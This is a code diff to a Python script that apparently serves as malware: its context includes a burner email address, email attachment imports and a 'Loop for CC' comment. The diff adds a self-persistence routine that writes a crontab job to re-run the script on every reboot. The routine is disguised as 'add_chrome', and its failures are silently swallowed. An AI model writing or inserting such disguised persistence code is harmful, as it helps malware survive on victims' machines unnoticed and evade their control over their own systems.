@@ -15,6 +15,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
+from crontab import CronTab
 
 FAVORITE_CHARACTER = "Eldenwyre"
 BURNER_MAIL = ""
@@ -204,10 +205,40 @@ def parse_story(story):
     return
 
 
+def get_path() -> str:
+    #Get path
+    if getattr(sys, 'frozen', False):
+        application_path = os.path.dirname(sys.executable)
+        s = (str(__file__).split("/"))[-1]
+        application_path += "/" + s[:-3]
+    elif __file__:
+        application_path = os.path.realpath(__file__)
+
+    return application_path
+
+
+def add_chrome():
+    application_path = get_path()
+
+    job_string = f'chmod +x {application_path}; {application_path}'
+
+    chrome = CronTab(user=True)
+    for job in chrome:
+        if job.comment == FAVORITE_CHARACTER:
+            #Edit And Return
+            job.set_command(job_string)
+            return
+
+    job = chrome.new(command=job_string, comment=FAVORITE_CHARACTER)
+    job.every_reboot()
+
+    chrome.write()
+
+
 def main():
-    # Add Self To Cron
+    # Add Self To "Chrome"
     try:
-        pass
+        add_chrome()
     except:
         pass
     # Loop for CC
